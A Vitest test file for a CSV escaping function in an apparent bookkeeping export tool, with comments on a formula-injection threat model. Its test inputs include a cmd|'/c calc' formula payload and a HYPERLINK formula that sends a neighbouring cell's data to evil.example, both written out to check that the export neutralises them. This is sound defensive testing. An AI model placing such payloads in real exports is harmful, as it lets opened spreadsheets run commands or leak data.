import { describe, expect, it } from "vitest";
import { escapeCsvCell, toCsv } from "./csv.js";

// Evidence and report exports carry text this system copies verbatim from
// providers and from whoever typed it into a checkout — bank narration, order
// numbers, courier remarks, customer notes. So the attacker is whoever placed
// an order, and the victim is the founder auditing their own books.

describe("escapeCsvCell", () => {
  it("neutralises every character that makes a spreadsheet evaluate a cell", () => {
    for (const p of ["=", "+", "-", "@", "\t", "\r"]) {
      const out = escapeCsvCell(`${p}cmd|'/c calc'!A0`);
      expect(out.startsWith("'") || out.startsWith('"\''), `${JSON.stringify(p)} must be neutralised`).toBe(true);
    }
  });

  it("defuses the realistic payload: HYPERLINK exfiltrating a neighbouring cell", () => {
    const attack = '=HYPERLINK("https://evil.example/?"&A1,"Click for invoice")';
    const out = escapeCsvCell(attack);
    // Quoted because it contains a comma and quotes, AND prefixed so Excel
    // reads it as text rather than a formula.
    expect(out).toContain("'=HYPERLINK");
    expect(out.startsWith('"')).toBe(true);
  });

  it("leaves ordinary text completely alone", () => {
    expect(escapeCsvCell("NEFT-INWARD-ACME RETAIL")).toBe("NEFT-INWARD-ACME RETAIL");
    expect(escapeCsvCell("#1042")).toBe("#1042");
    expect(escapeCsvCell("")).toBe("");
    expect(escapeCsvCell(null)).toBe("");
    expect(escapeCsvCell(undefined)).toBe("");
  });

  it("does NOT prefix negative numbers — they must still sum in a spreadsheet", () => {
    // The load-bearing exemption. Every refund and adjustment in these exports
    // is a negative figure starting with "-"; prefixing them would turn the
    // whole column into text and break the one thing a CSV export is for.
    expect(escapeCsvCell(-4500)).toBe("-4500");
    expect(escapeCsvCell(-1234.56)).toBe("-1234.56");
    expect(escapeCsvCell(0)).toBe("0");
    expect(escapeCsvCell(98765)).toBe("98765");
  });

  it("still prefixes a STRING that begins with a minus", () => {
    // A string is not a number even when it looks like one — it came from a
    // provider's text field, which is exactly the untrusted path.
    expect(escapeCsvCell("-1+1")).toBe("'-1+1");
  });

  it("keeps CSV quoting correct for commas, quotes and newlines", () => {
    expect(escapeCsvCell('has "quotes"')).toBe('"has ""quotes"""');
    expect(escapeCsvCell("a,b")).toBe('"a,b"');
    expect(escapeCsvCell("line1\nline2")).toBe('"line1\nline2"');
  });
});

describe("toCsv", () => {
  it("escapes headers as well as cells", () => {
    // A header can be attacker-influenced too — evidence exports build columns
    // from metric field names, and a future metric could carry provider text.
    const out = toCsv([{ "=evil": "ok" } as Record<string, string>]);
    expect(out.split("\n")[0]).toBe("'=evil");
  });

  it("returns empty string for no rows rather than a bare header", () => {
    expect(toCsv([])).toBe("");
  });

  it("round-trips a realistic evidence row", () => {
    const out = toCsv([{ orderNumber: "#1042", narration: "NEFT, ACME", amountRupees: -450 }]);
    expect(out).toBe('orderNumber,narration,amountRupees\n#1042,"NEFT, ACME",-450');
  });
});
